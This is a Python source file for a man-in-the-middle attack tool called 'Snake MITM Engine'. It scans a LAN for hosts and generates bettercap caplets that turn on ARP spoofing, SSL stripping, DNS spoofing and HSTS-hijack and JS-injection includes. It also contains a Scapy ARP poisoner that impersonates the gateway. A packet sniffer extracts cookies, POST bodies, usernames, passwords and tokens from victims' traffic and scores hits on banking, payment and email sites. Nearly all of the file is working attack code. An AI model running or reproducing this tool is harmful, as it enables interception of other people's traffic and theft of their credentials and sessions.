#!/usr/bin/env python3
"""
Snake MITM Engine — bettercap + Scapy based MITM orchestrator
Clean, decoupled, thread-safe. Emits parsed events to SocketIO.
"""
import os
import re
import sys
import json
import time
import uuid
import socket
import struct
import threading
import subprocess
import ipaddress
import signal
import shutil
from pathlib import Path
from typing import Optional, Callable, List, Dict
from dataclasses import dataclass, field, asdict
from enum import Enum
from collections import defaultdict, deque

try:
    import scapy.all as scapy
except ImportError:
    scapy = None

# ── Constants ────────────────────────────────────────────────────────────────
MITM_DIR   = Path(__file__).resolve().parent
BASE_DIR   = MITM_DIR.parent.parent
LOGS_DIR   = BASE_DIR / "snakefw" / "logs"
CAP_DIR    = BASE_DIR / "snakefw" / "captures"
LOGS_DIR.mkdir(parents=True, exist_ok=True)
CAP_DIR.mkdir(parents=True, exist_ok=True)


# ── Data Models ──────────────────────────────────────────────────────────────
class PacketType(str, Enum):
    HTTP       = "HTTP"
    HTTPS      = "HTTPS"
    DNS        = "DNS"
    CRED       = "CRED"          # captured credential
    ARP        = "ARP"
    TCP        = "TCP"
    UDP        = "UDP"
    ICMP       = "ICMP"
    HANDSHAKE  = "HANDSHAKE"     # TLS handshake
    POST       = "POST"          # HTTP POST (may have creds)
    COOKIE     = "COOKIE"
    OTHER      = "OTHER"


@dataclass
class CapturedPacket:
    id:         str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    ts:         float = field(default_factory=time.time)
    ptype:      str = PacketType.OTHER.value
    src_ip:     str = ""
    dst_ip:     str = ""
    src_port:   int = 0
    dst_port:   int = 0
    src_mac:    str = ""
    dst_mac:    str = ""
    proto:      str = ""
    host:       str = ""
    url:        str = ""
    method:     str = ""
    body:       str = ""
    headers:    dict = field(default_factory=dict)
    credential: dict = field(default_factory=dict)   # {user, pass, form}
    size:       int = 0
    raw_summary: str = ""
    danger:     int = 0    # 0-10 danger score

    def to_dict(self):
        d = asdict(self)
        d['ts_fmt'] = time.strftime('%H:%M:%S', time.localtime(self.ts))
        return d


@dataclass
class MITMTarget:
    ip:    str
    mac:   str = ""
    host:  str = ""
    vendor: str = ""
    packets_in:  int = 0
    packets_out: int = 0
    bytes_in:    int = 0
    bytes_out:   int = 0

    def to_dict(self):
        return asdict(self)


class MITMStats:
    def __init__(self):
        self.reset()

    def reset(self):
        self.started_at    = 0.0
        self.packets_total = 0
        self.bytes_total   = 0
        self.http_reqs     = 0
        self.dns_queries   = 0
        self.creds_found   = 0
        self.cookies_found = 0
        self.hosts_seen    = set()
        self.protocols     = defaultdict(int)
        self.top_hosts     = defaultdict(int)
        self.timeline      = deque(maxlen=120)   # 2-min rolling (1s buckets)

    def to_dict(self):
        return {
            "started_at":    self.started_at,
            "uptime":        int(time.time() - self.started_at) if self.started_at else 0,
            "packets_total": self.packets_total,
            "bytes_total":   self.bytes_total,
            "http_reqs":     self.http_reqs,
            "dns_queries":   self.dns_queries,
            "creds_found":   self.creds_found,
            "cookies_found": self.cookies_found,
            "hosts_count":   len(self.hosts_seen),
            "protocols":     dict(self.protocols),
            "top_hosts":     dict(sorted(self.top_hosts.items(), key=lambda x: -x[1])[:10]),
            "timeline":      list(self.timeline),
        }


# ── Credential Patterns ───────────────────────────────────────────────────────
CRED_PATTERNS = [
    (re.compile(r'(?:username|user|login|email|uname)["\s=:]+([^&"\s]{2,64})', re.I), 'username'),
    (re.compile(r'(?:password|pass|passwd|pwd)["\s=:]+([^&"\s]{2,64})', re.I),        'password'),
    (re.compile(r'(?:token|api[_-]?key|auth)["\s=:]+([A-Za-z0-9_\-\.]{8,128})', re.I), 'token'),
]

SENSITIVE_HOSTS = re.compile(
    r'(facebook|twitter|instagram|gmail|yahoo|hotmail|paypal'
    r'|amazon|ebay|netflix|bank|login|signin|auth|account'
    r'|password|secure|checkout)', re.I
)


def extract_credentials(body: str, host: str = "") -> dict:
    """Extract credentials from HTTP body or query string."""
    cred = {}
    for pattern, label in CRED_PATTERNS:
        m = pattern.search(body)
        if m:
            cred[label] = m.group(1)[:128]
    if cred:
        cred["host"] = host
        cred["raw"]  = body[:512]
    return cred


# ── Bettercap Caplet Builder ──────────────────────────────────────────────────
def _bettercap_caplet_exists(name: str) -> bool:
    path = Path("/usr/share/bettercap/caplets") / name
    return path.is_file()


def build_bettercap_caplet(
    iface:     str,
    gateway:   str,
    targets:   List[str],
    caplet_path: str,
    http_port: int = 8081,
    dns_spoof: bool = False,
    sslstrip:  bool = False,
    mitm_profile: str = "harvest",
) -> str:
    """Generate a bettercap caplet for MITM."""
    target_str = ", ".join(targets) if targets else "/"
    profile = (mitm_profile or "harvest").lower()
    if profile not in ("harvest", "hunt", "hijack"):
        profile = "harvest"
    if profile == "hunt":
        dns_spoof = True
    if profile == "hijack":
        sslstrip = True

    pcap_out = str(CAP_DIR / f"mitm_{int(time.time())}.pcap")

    lines = [
        f"# Snake MITM Caplet — generated {time.strftime('%Y-%m-%d %H:%M:%S')}",
        f"# profile: {profile}",
        f"set $ {{green}}snake{{reset}} » ",
        f"",
        f"# Interface & targets",
        f"set net.interface {iface}",
        f"set net.show.meta true",
        f"",
        f"# ARP spoofing",
        f"set arp.spoof.targets {target_str}",
        f"set arp.spoof.internal true",
        f"set arp.spoof.fullduplex true",
        f"arp.spoof on",
        f"",
        f"# Packet sniffing (output to stdout for parsing)",
        f"set net.sniff.verbose false",
        f"set net.sniff.local false",
        f"set net.sniff.output {pcap_out}",
        f"net.sniff on",
        f"",
        f"# HTTP proxy for credential harvesting",
        f"set http.proxy.port {http_port}",
        f"set http.proxy.injectjs false",
    ]

    if sslstrip or profile == "hijack":
        lines += [
            f"# SSL Strip (redirect HTTPS → HTTP)",
            f"set http.proxy.sslstrip true",
        ]

    lines += [f"http.proxy on", ""]

    if dns_spoof or profile == "hunt":
        lines += [
            f"# DNS spoof (redirect all to gateway)",
            f"set dns.spoof.all true",
            f"set dns.spoof.address {gateway}",
            f"dns.spoof on",
            f"",
        ]

    if profile == "hijack":
        if _bettercap_caplet_exists("hstshijack.cap"):
            lines += ["# Bundled caplet: TLS downgrade / hijack helpers", "include hstshijack.cap", ""]
        if _bettercap_caplet_exists("jsinject.cap"):
            lines += ["include jsinject.cap", ""]

    lines += [
        f"# Show network activity",
        f"net.probe on",
        f"",
        f"# Status ticker",
        f"events.stream on",
    ]

    caplet = "\n".join(lines)
    with open(caplet_path, "w") as f:
        f.write(caplet)
    return caplet


# ── Network Discovery (fast ARP scan) ────────────────────────────────────────
def gateway_subnet(gateway: str) -> str:
    """Build a /24 CIDR from the default gateway (typical home LAN)."""
    try:
        addr = ipaddress.ip_address(gateway.strip())
        if addr.version != 4:
            return ""
        octets = str(addr).split(".")
        return f"{octets[0]}.{octets[1]}.{octets[2]}.0/24"
    except ValueError:
        return ""


def _merge_hosts(hosts: List[MITMTarget], found: List[MITMTarget]) -> None:
    known = {h.ip for h in hosts}
    for item in found:
        if item.ip not in known:
            hosts.append(item)
            known.add(item.ip)


def _discover_nmap(iface: str, subnet: str, gateway: str, timeout: int) -> List[MITMTarget]:
    if not shutil.which("nmap") or not subnet:
        return []
    cmd = ["nmap", "-sn", "-T4", "--host-timeout", "3s", "-e", iface, subnet]
    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        timeout=max(timeout, 10),
    )
    hosts: List[MITMTarget] = []
    for line in (result.stdout or "").splitlines():
        if "Nmap scan report for" not in line:
            continue
        m = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
        if not m:
            continue
        ip = m.group(1)
        if ip != gateway:
            hosts.append(MITMTarget(ip=ip))
    return hosts


def _discover_arp_scan(iface: str, gateway: str) -> List[MITMTarget]:
    if not shutil.which("arp-scan"):
        return []
    result = subprocess.run(
        ["arp-scan", "--interface", iface, "--localnet", "--ignoredups"],
        capture_output=True,
        text=True,
        timeout=30,
    )
    hosts: List[MITMTarget] = []
    for line in (result.stdout or "").splitlines():
        m = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]{17})", line, re.I)
        if not m:
            continue
        ip, mac = m.group(1), m.group(2)
        if ip != gateway:
            hosts.append(MITMTarget(ip=ip, mac=mac))
    return hosts


def _discover_ip_neigh(iface: str, gateway: str) -> List[MITMTarget]:
    result = subprocess.run(
        ["ip", "neigh", "show", "dev", iface],
        capture_output=True,
        text=True,
        timeout=5,
    )
    hosts: List[MITMTarget] = []
    for line in (result.stdout or "").splitlines():
        m = re.match(
            r"(\d+\.\d+\.\d+\.\d+)\s+(?:lladdr\s+)?([0-9a-f:]{17})",
            line,
            re.I,
        )
        if not m:
            continue
        ip, mac = m.group(1), m.group(2).lower()
        if ip == gateway or mac == "00:00:00:00:00:00":
            continue
        hosts.append(MITMTarget(ip=ip, mac=mac))
    return hosts


def _discover_scapy_arp(iface: str, subnet: str, gateway: str) -> List[MITMTarget]:
    if scapy is None or not subnet:
        return []
    try:
        ans, _unans = scapy.srp(
            scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            / scapy.ARP(pdst=subnet),
            iface=iface,
            timeout=4,
            verbose=False,
        )
    except Exception:
        return []
    hosts: List[MITMTarget] = []
    for _sent, received in ans:
        ip = received[scapy.ARP].psrc
        mac = received[scapy.Ether].src
        if ip != gateway:
            hosts.append(MITMTarget(ip=ip, mac=mac))
    return hosts


def discover_hosts(iface: str, gateway: str, timeout: int = 10,
                   callback: Optional[Callable] = None) -> List[MITMTarget]:
    """Discover LAN hosts on the same L2 segment as gateway (managed iface)."""
    hosts: List[MITMTarget] = []
    subnet = gateway_subnet(gateway)

    if callback:
        callback(f"[*] Discovering hosts on {iface} (subnet {subnet or 'unknown'})...")

    for label, finder in (
        ("nmap", lambda: _discover_nmap(iface, subnet, gateway, timeout)),
        ("arp-scan", lambda: _discover_arp_scan(iface, gateway)),
        ("scapy ARP", lambda: _discover_scapy_arp(iface, subnet, gateway)),
        ("ip neigh", lambda: _discover_ip_neigh(iface, gateway)),
    ):
        try:
            found = finder()
            if found:
                _merge_hosts(hosts, found)
                if callback:
                    callback(f"[+] {label}: {len(found)} host(s)")
        except (OSError, subprocess.TimeoutExpired, ValueError):
            continue

    if not hosts:
        try:
            result = subprocess.run(["arp", "-n"], capture_output=True, text=True, timeout=5)
            fallback: List[MITMTarget] = []
            for line in (result.stdout or "").splitlines():
                m = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+\S+\s+([0-9a-f:]{17})", line, re.I)
                if m and m.group(2) not in ("00:00:00:00:00:00", "<incomplete>"):
                    if m.group(1) != gateway:
                        fallback.append(MITMTarget(ip=m.group(1), mac=m.group(2)))
            _merge_hosts(hosts, fallback)
        except OSError:
            pass

    if callback:
        callback(f"[+] Found {len(hosts)} hosts total")
    return hosts


# ── Scapy Packet Sniffer ──────────────────────────────────────────────────────
class PacketSniffer:
    """
    Scapy-based packet sniffer that parses HTTP, DNS, ARP
    and emits structured CapturedPacket events.
    """

    def __init__(self, iface: str, callback: Callable,
                 targets: Optional[List[str]] = None):
        self.iface     = iface
        self.callback  = callback
        self.targets   = set(targets or [])
        self._stop     = threading.Event()
        self._thread   = None
        self.stats     = MITMStats()
        self._timeline_bucket = {'ts': 0, 'count': 0, 'bytes': 0}

    def start(self):
        self.stats.reset()
        self.stats.started_at = time.time()
        self._stop.clear()
        self._thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self._thread.start()
        return self

    def stop(self):
        self._stop.set()

    def _sniff_loop(self):
        try:
            if scapy is None:
                raise RuntimeError("Scapy is not installed")
            scapy.sniff(
                iface=self.iface,
                prn=self._handle_packet,
                store=False,
                stop_filter=lambda _: self._stop.is_set(),
                timeout=None,
            )
        except Exception as e:
            self.callback(None, f"Sniffer error: {e}")

    def _handle_packet(self, pkt):
        try:
            if scapy is None:
                return
            cp = CapturedPacket()
            cp.size = len(pkt)

            # ── Track timeline ──────────────────────────────────────────────
            now_bucket = int(time.time())
            if now_bucket != self._timeline_bucket['ts']:
                if self._timeline_bucket['ts']:
                    self.stats.timeline.append({
                        'ts':    self._timeline_bucket['ts'],
                        'count': self._timeline_bucket['count'],
                        'bytes': self._timeline_bucket['bytes'],
                    })
                self._timeline_bucket = {'ts': now_bucket, 'count': 0, 'bytes': 0}
            self._timeline_bucket['count'] += 1
            self._timeline_bucket['bytes'] += cp.size
            self.stats.packets_total += 1
            self.stats.bytes_total   += cp.size

            # ── Ethernet ────────────────────────────────────────────────────
            if scapy.Ether in pkt:
                cp.src_mac = pkt[scapy.Ether].src
                cp.dst_mac = pkt[scapy.Ether].dst

            # ── ARP ─────────────────────────────────────────────────────────
            if scapy.ARP in pkt:
                arp = pkt[scapy.ARP]
                cp.ptype    = PacketType.ARP.value
                cp.src_ip   = arp.psrc
                cp.dst_ip   = arp.pdst
                cp.raw_summary = f"ARP {'who-has' if arp.op==1 else 'is-at'} {arp.pdst} ← {arp.psrc}"
                cp.danger   = 2
                self.stats.protocols['ARP'] += 1
                self.callback(cp)
                return

            # ── IP layer ─────────────────────────────────────────────────────
            if scapy.IP not in pkt:
                return

            cp.src_ip = pkt[scapy.IP].src
            cp.dst_ip = pkt[scapy.IP].dst

            # Filter to targets if specified
            if self.targets:
                if cp.src_ip not in self.targets and cp.dst_ip not in self.targets:
                    return

            # ── DNS ──────────────────────────────────────────────────────────
            if scapy.DNS in pkt and pkt[scapy.DNS].qr == 0:  # query
                qname = ""
                if pkt[scapy.DNS].qd:
                    qname = pkt[scapy.DNS].qd.qname.decode('utf-8', errors='replace').rstrip('.')
                cp.ptype    = PacketType.DNS.value
                cp.host     = qname
                cp.proto    = "DNS"
                cp.dst_port = 53
                cp.raw_summary = f"DNS? {qname}"
                cp.danger   = 1
                self.stats.dns_queries   += 1
                self.stats.hosts_seen.add(qname)
                self.stats.protocols['DNS'] += 1
                self.stats.top_hosts[qname] += 1
                if SENSITIVE_HOSTS.search(qname):
                    cp.danger = 5
                self.callback(cp)
                return

            # ── TCP ──────────────────────────────────────────────────────────
            if scapy.TCP in pkt:
                tcp      = pkt[scapy.TCP]
                cp.src_port = tcp.sport
                cp.dst_port = tcp.dport
                cp.proto    = "TCP"

                # ── HTTP (port 80 or common HTTP ports) ──────────────────────
                raw = bytes(pkt[scapy.Raw].load) if scapy.Raw in pkt else b""
                if (tcp.dport in (80, 8080, 8000, 3000, 4000) or
                    tcp.sport in (80, 8080, 8000, 3000, 4000)) and raw:

                    text = raw.decode('utf-8', errors='replace')
                    cp.ptype = PacketType.HTTP.value
                    cp.proto = "HTTP"
                    self.stats.http_reqs    += 1
                    self.stats.protocols['HTTP'] += 1

                    # Parse HTTP request
                    lines   = text.split('\r\n')
                    req_line = lines[0] if lines else ""
                    m = re.match(r'(GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH)\s+(\S+)\s+HTTP', req_line)
                    if m:
                        cp.method = m.group(1)
                        cp.url    = m.group(2)

                    # Extract Host header
                    for line in lines[1:]:
                        if line.lower().startswith('host:'):
                            cp.host = line.split(':', 1)[1].strip()
                            self.stats.top_hosts[cp.host] += 1
                            self.stats.hosts_seen.add(cp.host)
                            break

                    # Cookie extraction
                    cookie_m = re.search(r'Cookie:\s*(.+)', text, re.I)
                    if cookie_m:
                        cp.headers['cookie'] = cookie_m.group(1)[:512]
                        cp.ptype = PacketType.COOKIE.value
                        cp.danger = max(cp.danger, 6)
                        self.stats.cookies_found += 1

                    # POST body credential extraction
                    if cp.method == "POST" and '\r\n\r\n' in text:
                        body = text.split('\r\n\r\n', 1)[1]
                        cp.body = body[:1024]
                        cp.ptype = PacketType.POST.value
                        cp.danger = max(cp.danger, 7)

                        creds = extract_credentials(body, cp.host)
                        if creds:
                            cp.credential = creds
                            cp.ptype      = PacketType.CRED.value
                            cp.danger     = 10
                            self.stats.creds_found += 1

                    if SENSITIVE_HOSTS.search(cp.host or ""):
                        cp.danger = max(cp.danger, 8)

                    cp.raw_summary = (
                        f"HTTP {cp.method or 'REQ'} {cp.host}{cp.url[:60]}"
                        if cp.host else f"HTTP {cp.method or 'REQ'} {cp.dst_ip}"
                    )

                # ── HTTPS TLS handshake ──────────────────────────────────────
                elif tcp.dport == 443 and raw and raw[0:1] == b'\x16':
                    cp.ptype    = PacketType.HANDSHAKE.value
                    cp.proto    = "TLS"
                    cp.danger   = 3
                    self.stats.protocols['HTTPS'] += 1
                    # Try to extract SNI
                    sni = _extract_sni(raw)
                    if sni:
                        cp.host = sni
                        cp.raw_summary = f"TLS → {sni}"
                        self.stats.top_hosts[sni] += 1
                        self.stats.hosts_seen.add(sni)
                        if SENSITIVE_HOSTS.search(sni):
                            cp.danger = 7
                    else:
                        cp.raw_summary = f"TLS {cp.src_ip}:{cp.src_port} → {cp.dst_ip}:443"

                else:
                    cp.ptype = PacketType.TCP.value
                    cp.proto = "TCP"
                    cp.raw_summary = f"TCP {cp.src_ip}:{tcp.sport} → {cp.dst_ip}:{tcp.dport}"
                    self.stats.protocols['TCP'] += 1

            # ── UDP ──────────────────────────────────────────────────────────
            elif scapy.UDP in pkt:
                udp = pkt[scapy.UDP]
                cp.src_port = udp.sport
                cp.dst_port = udp.dport
                cp.ptype    = PacketType.UDP.value
                cp.proto    = "UDP"
                cp.raw_summary = f"UDP {cp.src_ip}:{udp.sport} → {cp.dst_ip}:{udp.dport}"
                self.stats.protocols['UDP'] += 1

            else:
                return  # skip non-TCP/UDP non-ARP

            # Only emit interesting packets
            if cp.danger >= 1 or cp.ptype in (
                PacketType.HTTP.value, PacketType.DNS.value,
                PacketType.CRED.value, PacketType.POST.value,
                PacketType.COOKIE.value, PacketType.HANDSHAKE.value,
            ):
                self.callback(cp)

        except Exception:
            pass


def _extract_sni(raw: bytes) -> str:
    """Extract SNI from TLS ClientHello."""
    try:
        if len(raw) < 43:
            return ""
        # Skip record header (5) + handshake header (4) + version (2) + random (32)
        pos = 5 + 4 + 2 + 32
        sess_len = raw[pos]
        pos += 1 + sess_len
        cipher_len = struct.unpack("!H", raw[pos:pos+2])[0]
        pos += 2 + cipher_len
        comp_len = raw[pos]
        pos += 1 + comp_len
        if pos + 2 > len(raw):
            return ""
        ext_len = struct.unpack("!H", raw[pos:pos+2])[0]
        pos += 2
        end = pos + ext_len
        while pos + 4 < end:
            ext_type = struct.unpack("!H", raw[pos:pos+2])[0]
            ext_size = struct.unpack("!H", raw[pos+2:pos+4])[0]
            pos += 4
            if ext_type == 0:  # SNI
                sni_list_len = struct.unpack("!H", raw[pos:pos+2])[0]
                if raw[pos+2] == 0:  # host_name type
                    name_len = struct.unpack("!H", raw[pos+3:pos+5])[0]
                    return raw[pos+5:pos+5+name_len].decode('utf-8', errors='replace')
            pos += ext_size
    except Exception:
        pass
    return ""


# ── Bettercap Process Manager ─────────────────────────────────────────────────
class BettercapSession:
    """Manages a bettercap subprocess with live output parsing."""

    def __init__(self, iface: str, caplet: str,
                 callback: Optional[Callable] = None):
        self.iface    = iface
        self.caplet   = caplet
        self.callback = callback
        self._proc    = None
        self._thread  = None
        self._running = False

    def start(self):
        cmd = [
            "bettercap",
            "--iface",   self.iface,
            "--caplet",  self.caplet,
            "--no-colors",
            "--silent",
        ]
        log = str(LOGS_DIR / f"bettercap_{int(time.time())}.log")
        self._log_fh = open(log, "w")
        self._proc   = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True, bufsize=1,
            start_new_session=True,
        )
        self._running = True
        self._thread  = threading.Thread(target=self._reader, daemon=True)
        self._thread.start()
        if self.callback:
            self.callback(f"[🐍] bettercap started (PID {self._proc.pid})")
        return self

    def _reader(self):
        for line in self._proc.stdout:
            line = line.rstrip()
            self._log_fh.write(line + "\n")
            self._log_fh.flush()
            if self.callback:
                self.callback(line)
        self._proc.wait()
        self._running = False
        self._log_fh.close()
        if self.callback:
            self.callback("[*] bettercap exited")

    def send(self, cmd: str):
        """Send an interactive command to bettercap."""
        if self._proc and self._proc.stdin:
            self._proc.stdin.write(cmd + "\n")
            self._proc.stdin.flush()

    def stop(self):
        self._running = False
        if self._proc:
            try:
                os.killpg(self._proc.pid, signal.SIGTERM)
                self._proc.wait(timeout=5)
            except Exception:
                try:
                    os.killpg(self._proc.pid, signal.SIGKILL)
                except Exception:
                    pass


# ── ARP Spoofer (Scapy fallback) ──────────────────────────────────────────────
class ArpSpoofer:
    """Pure-scapy ARP spoofer — fallback if bettercap is unavailable."""

    def __init__(self, iface: str, gateway_ip: str, target_ip: str,
                 callback: Optional[Callable] = None):
        self.iface      = iface
        self.gateway_ip = gateway_ip
        self.target_ip  = target_ip
        self.callback   = callback
        self._stop      = threading.Event()
        self._t         = None

    def _get_mac(self, ip: str) -> str:
        try:
            if scapy is None:
                return ""
            ans, _ = scapy.srp(
                scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip),
                iface=self.iface, timeout=2, verbose=False,
            )
            return ans[0][1].hwsrc if ans else ""
        except Exception:
            return ""

    def start(self):
        try:
            if scapy is None:
                raise RuntimeError("Scapy is not installed")
            gateway_mac = self._get_mac(self.gateway_ip)
            target_mac  = self._get_mac(self.target_ip)
            my_mac      = scapy.get_if_hwaddr(self.iface)

            if not gateway_mac or not target_mac:
                if self.callback:
                    self.callback(f"[!] Could not resolve MACs for ARP spoof")
                return

            # Poison target: tell it we are the gateway
            pkt_target = (
                scapy.Ether(dst=target_mac, src=my_mac) /
                scapy.ARP(op=2, pdst=self.target_ip, hwdst=target_mac,
                          psrc=self.gateway_ip, hwsrc=my_mac)
            )
            # Poison gateway: tell it we are the target
            pkt_gw = (
                scapy.Ether(dst=gateway_mac, src=my_mac) /
                scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac,
                          psrc=self.target_ip, hwsrc=my_mac)
            )

            if self.callback:
                self.callback(f"[⚡] ARP poisoning {self.target_ip} ↔ {self.gateway_ip}")

            self._stop.clear()

            def _loop():
                while not self._stop.is_set():
                    scapy.sendp(pkt_target, iface=self.iface, verbose=False)
                    scapy.sendp(pkt_gw, iface=self.iface, verbose=False)
                    time.sleep(2)
                # Restore ARP tables on stop
                restore_t = (
                    scapy.Ether(dst=target_mac, src=gateway_mac) /
                    scapy.ARP(op=2, pdst=self.target_ip, hwdst=target_mac,
                              psrc=self.gateway_ip, hwsrc=gateway_mac)
                )
                restore_g = (
                    scapy.Ether(dst=gateway_mac, src=target_mac) /
                    scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac,
                              psrc=self.target_ip, hwsrc=target_mac)
                )
                for _ in range(5):
                    scapy.sendp(restore_t, iface=self.iface, verbose=False)
                    scapy.sendp(restore_g, iface=self.iface, verbose=False)
                    time.sleep(0.5)
                if self.callback:
                    self.callback(f"[+] ARP tables restored for {self.target_ip}")

            self._t = threading.Thread(target=_loop, daemon=True)
            self._t.start()
        except Exception as e:
            if self.callback:
                self.callback(f"[!] ARP spoof error: {e}")

    def stop(self):
        self._stop.set()


# ── High-level MITM Coordinator ───────────────────────────────────────────────
class MITMSession:
    """
    Orchestrates the full MITM pipeline:
    1. Enable IP forwarding
    2. Run bettercap (or pure-scapy ARP spoof as fallback)
    3. Scapy packet sniffing + parsing
    4. Emit events via callback
    """

    def __init__(self, iface: str, gateway: str,
                 targets: List[str],
                 on_packet: Optional[Callable] = None,
                 on_log:    Optional[Callable] = None,
                 dns_spoof: bool = False,
                 sslstrip:  bool = False,
                 use_bettercap: bool = True,
                 mitm_profile: str = "harvest"):
        self.iface     = iface
        self.gateway   = gateway
        self.targets   = targets
        self.on_packet = on_packet
        self.on_log    = on_log
        self.dns_spoof = dns_spoof
        self.sslstrip  = sslstrip
        self.use_bettercap = use_bettercap
        self.mitm_profile = mitm_profile or "harvest"

        self._bettercap: Optional[BettercapSession] = None
        self._sniffer:   Optional[PacketSniffer]    = None
        self._spoofers:  List[ArpSpoofer]           = []
        self._running    = False
        self.session_id  = str(uuid.uuid4())[:8]
        self.packets:    deque = deque(maxlen=500)  # rolling last 500
        self.creds:      List[dict] = []
        self.stats       = MITMStats()
        self._ip_forward_previous = "0"

    def _log(self, msg: str):
        if self.on_log:
            self.on_log(msg)

    def start(self) -> "MITMSession":
        self._log(f"[🎯] Starting MITM session {self.session_id}")
        self._running = True

        # 1. Enable IP forwarding
        try:
            with open("/proc/sys/net/ipv4/ip_forward") as f:
                self._ip_forward_previous = f.read().strip()
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
            self._log("[+] IP forwarding enabled")
        except Exception as e:
            self._log(f"[!] Could not enable IP forwarding: {e} (run as root)")

        # 2. Launch bettercap or fallback
        if self.use_bettercap:
            caplet_path = str(LOGS_DIR / f"snake_mitm_{self.session_id}.cap")
            build_bettercap_caplet(
                self.iface, self.gateway, self.targets,
                caplet_path,
                dns_spoof=self.dns_spoof,
                sslstrip=self.sslstrip,
                mitm_profile=self.mitm_profile,
            )
            self._bettercap = BettercapSession(
                self.iface, caplet_path,
                callback=self._log
            )
            try:
                self._bettercap.start()
                time.sleep(2)
            except Exception as e:
                self._log(f"[!] bettercap failed: {e} — using Scapy fallback")
                self._start_scapy_arp()
        else:
            self._start_scapy_arp()

        # 3. Start packet sniffer
        def _on_packet(cp):
            if isinstance(cp, CapturedPacket):
                self.stats.packets_total  = cp.id and self.stats.packets_total + 1 or self.stats.packets_total
                self.packets.append(cp.to_dict())
                if cp.credential:
                    self.creds.append(cp.to_dict())
                    self._log(f"[💥] CRED CAPTURED: {cp.credential}")
                if self.on_packet:
                    self.on_packet(cp.to_dict())
            elif isinstance(cp, str):
                self._log(cp)

        self._sniffer = PacketSniffer(
            self.iface, _on_packet, targets=self.targets
        )
        self.stats = self._sniffer.stats
        self._sniffer.start()
        self._log(f"[📡] Sniffing on {self.iface} targeting {self.targets or 'all'}")
        return self

    def _start_scapy_arp(self):
        for target in self.targets:
            sp = ArpSpoofer(
                self.iface, self.gateway, target,
                callback=self._log
            )
            sp.start()
            self._spoofers.append(sp)
            time.sleep(0.3)

    def stop(self):
        self._running = False
        self._log("[*] Stopping MITM session...")
        if self._sniffer:
            self._sniffer.stop()
        if self._bettercap:
            self._bettercap.stop()
        for sp in self._spoofers:
            sp.stop()
        # Restore the forwarding state that existed before this session.
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(self._ip_forward_previous)
        except Exception:
            pass
        self._log("[+] MITM session stopped. ARP tables restored.")

    def get_snapshot(self) -> dict:
        return {
            "session_id": self.session_id,
            "running":    self._running,
            "interface":  self.iface,
            "gateway":    self.gateway,
            "targets":    self.targets,
            "packets":    list(self.packets)[-100:],
            "creds":      self.creds[-50:],
            "stats":      self.stats.to_dict() if self.stats else {},
        }
